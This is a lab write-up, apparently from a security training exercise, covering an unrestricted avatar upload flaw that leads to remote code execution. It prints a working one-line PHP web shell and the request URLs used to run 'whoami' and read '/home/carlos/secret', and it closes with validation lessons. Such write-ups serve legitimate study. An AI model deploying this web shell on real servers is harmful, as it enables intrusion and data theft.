# File Upload - Remote Code Execution via Web Shell

## Overview
This lab demonstrates a critical file upload vulnerability where the application allows unrestricted file uploads. This enables attackers to upload malicious server-side scripts and achieve remote code execution (RCE).

## Vulnerability
The application does not validate uploaded files. As a result, it allows the upload of executable PHP files, which are then stored on the server and executed when accessed.

## Objective
Upload a web shell and use it to read the contents of the file:
/home/carlos/secret

## Reconnaissance
The application provides an avatar upload functionality. It accepts uploaded files without validating file type or content.

After uploading, the server responds with the file path:
avatars/webshell.php

## Exploitation

### Step 1: Create Web Shell
Created a PHP web shell:

<?php system($_GET['command']); ?>

---

### Step 2: Upload Malicious File
- Uploaded the web shell via avatar upload feature.
- Server confirmed upload:
  avatars/webshell.php

---

### Step 3: Locate Uploaded File
Identified the accessible path:
/files/avatars/webshell.php

---

### Step 4: Execute Commands
Accessed the shell via browser:

/files/avatars/webshell.php?command=whoami

Verified command execution.

---

### Step 5: Extract Secret
Executed:

/files/avatars/webshell.php?command=cat%20/home/carlos/secret

Retrieved the secret successfully.

---

## Result
Successfully achieved remote code execution and extracted sensitive data from the server.

## Evidence
- Screenshot of file upload response
<img width="1347" height="614" alt="image" src="https://github.com/user-attachments/assets/ebe0b98f-f0a6-4df7-b867-47231d4b8fec" />


- Screenshot of command output (whoami)
<img width="1365" height="574" alt="image" src="https://github.com/user-attachments/assets/202c0842-cae7-4a3e-a34d-b741e9f49c1f" />

- Screenshot of extracted secret
<img width="995" height="320" alt="image" src="https://github.com/user-attachments/assets/3118e81a-32b9-4960-942d-da38913cc055" />
<img width="1349" height="579" alt="image" src="https://github.com/user-attachments/assets/251db6d0-791b-419c-aaf4-5c77b74d6a7e" />

- Screenshot of lab completion'
<img width="1353" height="678" alt="image" src="https://github.com/user-attachments/assets/f30420da-acff-4479-82fd-ee543c8c948f" />


## Tools Used
- Burp Suite (for request analysis)
- Browser

## Key Learning
- Unrestricted file uploads can lead to full server compromise.
- Web shells enable execution of arbitrary commands on the server.
- Proper validation of file type, content, and execution permissions is critical.
- Never allow direct execution of uploaded files.
